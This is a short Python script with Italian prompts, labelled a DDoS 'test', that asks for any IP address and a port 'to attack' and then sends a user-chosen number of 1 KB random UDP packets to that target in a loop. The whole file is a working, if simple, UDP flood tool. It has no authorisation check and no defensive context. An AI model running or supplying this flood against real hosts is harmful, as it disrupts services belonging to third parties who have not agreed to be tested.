#PYTHON DDos TEST PACHETTI

import socket, random

print("Benvenuto nel test di DDos")

SRV_ADDR = input("Inserisci l'indirizzo IP: ")
SRV_PORT = int(input("Inserisci la porta da Attacare: "))

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

pacchetto = bytes([random.randint(0, 255) for _ in range(1024)])

npack = int(input("Quanti pacchetti da 1kb vuoi inviare?: "))

try:
        for i in range(npack):
                s.sendto(pacchetto,(SRV_ADDR, SRV_PORT))
                print("Pacchetto: ", i, "inviato")
except:
        print("Errore invio pacchetti")

s.close()